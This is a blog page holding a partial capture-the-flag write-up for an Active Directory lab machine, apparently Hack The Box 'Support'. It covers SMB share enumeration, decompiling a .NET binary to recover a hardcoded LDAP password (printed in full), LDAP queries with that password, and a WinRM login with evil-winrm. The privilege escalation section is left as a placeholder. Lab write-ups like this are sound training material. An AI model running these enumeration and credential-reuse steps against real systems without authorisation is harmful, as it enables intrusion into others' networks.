<!DOCTYPE html>
<html lang="en">
    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
        <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="author" content="">
<meta name="description" content="Resolution summary [!summary]
Mounted SMB share support-tools with anonymous access Downloaded .NET binaries for analysis Reversed .NET binary using DNSpy/ILSpy to find hardcoded LDAP password Used credentials to enumerate LDAP Extracted user password from LDAP info field Obtained WinRM access with discovered credentials Enumerated Active Directory for privilege escalation Improved skills SMB share mounting in Linux .NET binary reverse engineering DNSpy and ILSpy usage LDAP enumeration with ldapsearch Active Directory enumeration Credential extraction from compiled binaries Used tools [[SMBClient]] [[CrackMapExec]] mount (CIFS) DNSpy / ILSpy ldapsearch evil-winrm Information Gathering Scanned all TCP ports:
" />
<meta name="keywords" content="homepage, blog, cyber, cyberblog, cybersecurity, active-directory, smb, ldap, dnspy, reversing" />
<meta name="robots" content="noodp" />
<meta name="theme-color" content="" />
<link rel="canonical" href="http://localhost:1313/writeups/support/" />


    <title>
        
             :: Dragos Nutu 
        
    </title>





  <link rel="stylesheet" href="../../main.min.2729760c629597024c5de34b40ea9f372f2b5a2a192dcdca537b7ddfa483eab8.css" integrity="sha256-Jyl2DGKVlwJMXeNLQOqfNy8rWioZLc3KU3t936SD6rg=" crossorigin="anonymous">





    <link rel="apple-touch-icon" sizes="180x180" href="../../apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="../../favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="../../favicon-16x16.png">
    <link rel="manifest" href="../../site.webmanifest">
    <link rel="mask-icon" href="../../safari-pinned-tab.svg" color="">
    <link rel="shortcut icon" href="../../favicon.ico">
    <meta name="msapplication-TileColor" content="">



  <meta itemprop="name" content="Dragos Nutu">
  <meta itemprop="description" content="Resolution summary [!summary]
Mounted SMB share support-tools with anonymous access Downloaded .NET binaries for analysis Reversed .NET binary using DNSpy/ILSpy to find hardcoded LDAP password Used credentials to enumerate LDAP Extracted user password from LDAP info field Obtained WinRM access with discovered credentials Enumerated Active Directory for privilege escalation Improved skills SMB share mounting in Linux .NET binary reverse engineering DNSpy and ILSpy usage LDAP enumeration with ldapsearch Active Directory enumeration Credential extraction from compiled binaries Used tools [[SMBClient]] [[CrackMapExec]] mount (CIFS) DNSpy / ILSpy ldapsearch evil-winrm Information Gathering Scanned all TCP ports:">
  <meta itemprop="wordCount" content="345">
  <meta itemprop="image" content="http://localhost:1313/">
  <meta itemprop="keywords" content="Active-Directory,Smb,Ldap,Dnspy,Reversing">

  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:image" content="http://localhost:1313/">
  <meta name="twitter:title" content="Dragos Nutu">
  <meta name="twitter:description" content="Resolution summary [!summary]
Mounted SMB share support-tools with anonymous access Downloaded .NET binaries for analysis Reversed .NET binary using DNSpy/ILSpy to find hardcoded LDAP password Used credentials to enumerate LDAP Extracted user password from LDAP info field Obtained WinRM access with discovered credentials Enumerated Active Directory for privilege escalation Improved skills SMB share mounting in Linux .NET binary reverse engineering DNSpy and ILSpy usage LDAP enumeration with ldapsearch Active Directory enumeration Credential extraction from compiled binaries Used tools [[SMBClient]] [[CrackMapExec]] mount (CIFS) DNSpy / ILSpy ldapsearch evil-winrm Information Gathering Scanned all TCP ports:">



    <meta property="og:url" content="http://localhost:1313/writeups/support/">
  <meta property="og:site_name" content="Dragos Nutu">
  <meta property="og:title" content="Dragos Nutu">
  <meta property="og:description" content="Resolution summary [!summary]
Mounted SMB share support-tools with anonymous access Downloaded .NET binaries for analysis Reversed .NET binary using DNSpy/ILSpy to find hardcoded LDAP password Used credentials to enumerate LDAP Extracted user password from LDAP info field Obtained WinRM access with discovered credentials Enumerated Active Directory for privilege escalation Improved skills SMB share mounting in Linux .NET binary reverse engineering DNSpy and ILSpy usage LDAP enumeration with ldapsearch Active Directory enumeration Credential extraction from compiled binaries Used tools [[SMBClient]] [[CrackMapExec]] mount (CIFS) DNSpy / ILSpy ldapsearch evil-winrm Information Gathering Scanned all TCP ports:">
  <meta property="og:locale" content="en_us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="writeups">
    <meta property="article:tag" content="Active-Directory">
    <meta property="article:tag" content="Smb">
    <meta property="article:tag" content="Ldap">
    <meta property="article:tag" content="Dnspy">
    <meta property="article:tag" content="Reversing">
    <meta property="og:image" content="http://localhost:1313/">

















    </head>

    
        <body>
    
    
        <div class="container">
            <header class="header">
    <span class="header__inner">
        <a href="../../" style="text-decoration: none;">
    <div class="logo">
        
            <span class="logo__mark">></span>
            <span class="logo__text ">
                whoami</span>
            <span class="logo__cursor" style=
                  "
                   
                   ">
            </span>
        
    </div>
</a>


        <span class="header__right">
                <nav class="menu">
    <ul class="menu__inner"><li><a href="../../projects">Projects</a></li><li><a href="../../resume">Resume</a></li><li><a href="../../reviews">Reviews</a></li><li><a href="../../writeups">Writeups</a></li>
    </ul>
</nav>

                <span class="menu-trigger">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M0 0h24v24H0z" fill="none"/>
                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
                    </svg>
                </span>
                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
 </svg></span>
        </span>
    </span>
</header>


            <div class="content">
                
    <main class="post">

        <div class="post-info">
            
            </p>
        </div>

        <article>
            <h2 class="post-title"><a href="http://localhost:1313/writeups/support/"></a></h2>

            
            
            

            <div class="post-content">
                <h1 id="resolution-summary">Resolution summary</h1>
<blockquote>
<p>[!summary]</p>
<ul>
<li>Mounted SMB share support-tools with anonymous access</li>
<li>Downloaded .NET binaries for analysis</li>
<li>Reversed .NET binary using DNSpy/ILSpy to find hardcoded LDAP password</li>
<li>Used credentials to enumerate LDAP</li>
<li>Extracted user password from LDAP info field</li>
<li>Obtained WinRM access with discovered credentials</li>
<li>Enumerated Active Directory for privilege escalation</li>
</ul>
</blockquote>
<h2 id="improved-skills">Improved skills</h2>
<ul>
<li>SMB share mounting in Linux</li>
<li>.NET binary reverse engineering</li>
<li>DNSpy and ILSpy usage</li>
<li>LDAP enumeration with ldapsearch</li>
<li>Active Directory enumeration</li>
<li>Credential extraction from compiled binaries</li>
</ul>
<h2 id="used-tools">Used tools</h2>
<ul>
<li>[[SMBClient]]</li>
<li>[[CrackMapExec]]</li>
<li>mount (CIFS)</li>
<li>DNSpy / ILSpy</li>
<li>ldapsearch</li>
<li>evil-winrm</li>
</ul>
<hr>
<h1 id="information-gathering">Information Gathering</h1>
<p>Scanned all TCP ports:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sV -sC -p- 10.10.11.174 -oA nmap_scans/support
</span></span></code></pre></div><p>Enumerated open TCP ports:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Active Directory environment</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Port 445 - SMB</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Port 389 - LDAP</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Port 3268 - Global Catalog</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Port 5985 - WinRM</span>
</span></span></code></pre></div><hr>
<h1 id="enumeration">Enumeration</h1>
<h2 id="port-445---smb">Port 445 - SMB</h2>
<h3 id="default-domain-controller-shares">Default Domain Controller Shares</h3>
<p>Standard DC shares:</p>
<ul>
<li>C$</li>
<li>ADMIN$</li>
<li>IPC$</li>
<li>SYSVOL</li>
<li>NETLOGON</li>
</ul>
<h3 id="anonymous-enumeration">Anonymous Enumeration</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>crackmapexec smb 10.10.11.174 -u <span style="color:#e6db74">&#34;anonymous&#34;</span> -p <span style="color:#e6db74">&#34;&#34;</span> --shares
</span></span></code></pre></div><p>Found accessible share:</p>
<ul>
<li>support-tools (READ access)</li>
</ul>
<h3 id="mounting-smb-share">Mounting SMB Share</h3>
<p><strong>Important:</strong> In Linux, mount shares only under /mnt</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo mount -t cifs -o username<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;john&#34;</span> //10.10.11.174/support-tools /mnt/support-tools-share
</span></span></code></pre></div><p><strong>Note:</strong> Username parameter required even for anonymous access.</p>
<p>Downloaded .NET binaries for analysis.</p>
<h2 id="binary-analysis">Binary Analysis</h2>
<h3 id="tools-for-net-reverse-engineering">Tools for .NET Reverse Engineering</h3>
<ul>
<li><strong>DNSpy</strong> - Returns source code for .NET binaries</li>
<li><strong>ILSpy</strong> - Alternative .NET decompiler</li>
</ul>
<p>Analyzed downloaded binaries and found hardcoded LDAP credentials:</p>
<pre tabindex="0"><code>ldap@support.htb:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
</code></pre><h2 id="port-389---ldap">Port 389 - LDAP</h2>
<h3 id="ldap-enumeration">LDAP Enumeration</h3>
<p>Used discovered credentials to enumerate LDAP:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ldapsearch -x -H ldap://support.htb -D <span style="color:#e6db74">&#34;ldap@support.htb&#34;</span> -w <span style="color:#e6db74">&#34;nvEfEK16^1aM4\$e7AclUf8x\$tRWxPWO1%lmz&#34;</span> -b <span style="color:#e6db74">&#34;dc=support,dc=htb&#34;</span>
</span></span></code></pre></div><p>Enumerated specific user:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ldapsearch -x -H ldap://support.htb -D <span style="color:#e6db74">&#34;ldap@support.htb&#34;</span> -w <span style="color:#e6db74">&#34;nvEfEK16^1aM4\$e7AclUf8x\$tRWxPWO1%lmz&#34;</span> -b <span style="color:#e6db74">&#34;dc=support,dc=htb&#34;</span> <span style="color:#e6db74">&#34;(sAMAccountName=support)&#34;</span>
</span></span></code></pre></div><p>Found password in user info/description field.</p>
<hr>
<h1 id="exploitation">Exploitation</h1>
<h2 id="winrm-access">WinRM Access</h2>
<p>Connected with discovered credentials:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>evil-winrm -i support.htb -u support -p &lt;password&gt;
</span></span></code></pre></div><p>Obtained user shell.</p>
<hr>
<h1 id="privilege-escalation">Privilege Escalation</h1>
<h2 id="local-enumeration">Local enumeration</h2>
<p>Enumerated Active Directory:</p>
<ul>
<li>Groups and memberships</li>
<li>User permissions</li>
<li>Service accounts</li>
<li>Exploitable misconfigurations</li>
</ul>
<p><em>Further privilege escalation details would be documented here based on enumeration findings</em></p>
<hr>
<h1 id="trophy">Trophy</h1>
<blockquote>
<p>[!todo] <strong>User.txt</strong>
C:\Users\support\Desktop\user.txt</p>
</blockquote>
<blockquote>
<p>[!todo] <strong>Root.txt</strong>
C:\Users\Administrator\Desktop\root.txt</p>
</blockquote>
<h2 id="key-notes">Key Notes</h2>
<ul>
<li>SMB share mounting requires username parameter</li>
<li>.NET binaries can contain hardcoded secrets</li>
<li>LDAP user info fields may contain sensitive data</li>
<li>DNSpy/ILSpy essential for .NET reverse engineering</li>
</ul>

            </div>
        </article>

        <hr />

        <div class="post-info">
            
    <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>

        <span class="tag"><a href="http://localhost:1313/tags/active-directory/">active-directory</a></span>
        <span class="tag"><a href="http://localhost:1313/tags/smb/">smb</a></span>
        <span class="tag"><a href="http://localhost:1313/tags/ldap/">ldap</a></span>
        <span class="tag"><a href="http://localhost:1313/tags/dnspy/">dnspy</a></span>
        <span class="tag"><a href="http://localhost:1313/tags/reversing/">reversing</a></span>
        
    </p>

            
  		</div>
    </main>

            </div>

            
                <footer class="footer">
    
    <div class="footer__inner">
        <div class="footer__content">
            
            
            
            
            <span></span>
        </div>
    </div>
    
    
</footer>

            
        </div>

        



<script type="text/javascript" src="../../bundle.min.ad54ad97364f77ede35def9096b162bb1f0b3973aa50b080f5e82fa147f6882e2a7200d7535adbf9b51bebf939f1c1ca9bbe6be87530092aca720eac4a226fda.js" integrity="sha512-rVStlzZPd&#43;3jXe&#43;QlrFiux8LOXOqULCA9egvoUf2iC4qcgDXU1rb&#43;bUb6/k58cHKm75r6HUwCSrKcg6sSiJv2g=="></script>




    </body>
</html>
